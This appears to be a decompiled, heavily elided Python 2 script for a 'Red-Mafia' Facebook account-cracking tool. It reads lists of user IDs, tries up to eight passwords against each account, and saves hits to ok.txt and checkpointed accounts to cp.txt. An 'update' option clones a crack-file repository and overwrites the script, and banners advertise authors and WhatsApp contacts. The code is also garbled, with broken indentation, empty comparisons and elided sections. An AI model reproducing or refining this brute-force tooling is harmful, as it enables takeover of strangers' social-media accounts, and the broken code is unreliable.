# Decompile by Mardis (Tools By Majid ali)
# Time Succes decompile : 2022-03-25 23:54:37.420403


 Majid ali (TEAM OF Hackker majid)
...
try:
	...
	os.system("python2 Red-Mafia.py")
...
def main():
	...
	print("Author : Majid (Hackker majid)")
	print("GitHub : Majidali72")
	print("WHATSAPP : +923287505433")
	print("Team: Hackker majid Admin HM")
	print("_______________________________________________")
	print("")
	print("\t\033[93;1m Login  \x1b[0m")
	print("________________________________")
	print("\033[92;1m  [1] Login With Token")
	print("\033[93;1m  [2] Update")
	print("  [0] Exit")
        print("________________________________")
	log_sel()
...
def log_sel():
	...
	if sel == "":
		...
		main()
	elif sel =="" or sel =="" or sel =="" or sel =="":
		os.system('xdg-open https://wa.me/+923188214452')
		main()
	elif sel =="2" or sel =="02":
		import os
		try:
			os.system("git clone https://github.com/Red-Mafia/CRACK-FILE1.git")
			os.system("rm -rf Red-Mafia.py")
			os.system("cp -f Red-Mafia/Red-Mafia.py \\.")
			os.system("rm -rf Red-Mafia.py")
			print "\033[92;1m\n Thanks Updating...>_<\n"
			time.sleep(2)
			main()
		...
		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN Hackker majid (TEAM OF Hackker majid) :)")
		sys.exit()
	else:
		print("")
		print("\t\033[91;1m  Wrong")
		print("")
		log_sel()
...
def token():
    os.system("clear")
    try:
        token = open("bxb_token.txt", "r").read()
        menu()
...
def token_check():
	try:
		...
		print"\033[91;1m[!] Invalid"
		os.system('rm -rf bxb_token.txt')
...
def menu():
    ...
    print("Author : ANEEX12 (TEAM OF RED-MAFIA)")
    print("GitHub : ANEEX12")
    print("Team: Red-Mafia Admin RK")
    print("____________________________________")
    print("\033[93;1m     Welcome : \033[92;1m"+xn)
    print("\033[93;1m     Region : \033[92;1m") + loc
    print("\033[93;1m     Ip : \033[92;1m") + ip
    ...
    menu_option()
def menu_option():
	select = raw_input("\033[92;1m Enter: ")
	if select =="1":
		crack1()
	elif select =="":
		crack()
...
def crack1():
	...
	print("Author : ANEEX RXJX (TEAM OF RED-MAFIA)")
        print("GitHub : ANEEX12")
        print("_______________________________")
	print("\t\033[93;1m Crack File Menu")
	print("_______________________________")
	print("\033[94;1m ____________________________")
	print("\033[93;1m[1] File Crack ")
...
def crack_select1():
	...
	if select =="":
		...
		print("____________________________")
                print("Author : Majid (TEAM OF RED-MAFIA)")
                print("GitHub : ANEEX12")
                print("WhatsApp : +923287505433")
                print("Team: Hackker-majid Admin RK")
                print("_____________________________")

		print("\t\033[93;1m   File Crack Menu")
		print("")
		filelist = raw_input('\033[92;1m  Enter File Name: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
				
		except IOError:
			print("\t\033[91;1m  FILE NOT FOUND")
			print("")
		...
		crack_select1()
        print("________________________________")
        print("Author : A  (TEAM OF RED-MAFIA)")
        print("GitHub : ANEEX12")
        print("WhatsApp : +923156675789")
        print("_________________________________")
	print("\033[93;1m  Total Idz: \033[92;1m"+str(len(id)))
	print("\033[93;1m  Process Start")
	print("\033[92;1m  control X To Stop.....\x1b[0m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [Red-Mafia-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [Red-Mafia-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
...
if __name__ == '__main__':
	main()
print("Thanks For Team Of Red-Mafia Admin Riaz Khan")
